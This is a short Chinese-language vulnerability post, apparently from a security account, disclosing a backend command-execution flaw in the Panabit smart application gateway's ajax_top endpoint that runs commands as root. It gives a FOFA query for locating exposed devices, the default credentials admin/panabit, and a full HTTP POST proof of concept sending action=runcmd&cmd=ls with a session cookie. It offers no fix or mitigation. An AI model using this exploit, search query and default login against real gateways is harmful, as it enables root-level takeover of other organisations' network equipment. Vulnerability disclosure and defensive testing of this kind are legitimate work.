#  Panabit-智能应用网关-后台命令执行漏洞   
原创 骇客安全  骇客安全   2025-03-28 21:56  
  
# Panabit 智能应用网关 后台命令执行漏洞  
  
Panabit 智能应用网关 ajax_top 后台存在命令执行漏洞，攻击者可以以root权限运行部分危险命令.  
  
  
fofa：cert="panabit.com" && body="/login/login.js"  
  
  
默认密码：admin/panabit  
  
  
poc：  
  
```
POST /cgi-bin/Maintain/ajax_top?action=runcmd&cmd=ls HTTP/1.1
Host: 
Connection: close
Content-Length: 0
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cache-Control: no-cache
Accept-Language: zh-CN,zh;q=0.8
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: text/html; charset=GB2312
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Cookie: pauser_1618744108=paonline_admin_9328_16197064781_c4229a3a492c76e334f57728abced88b|443|;
```  
  
  
  
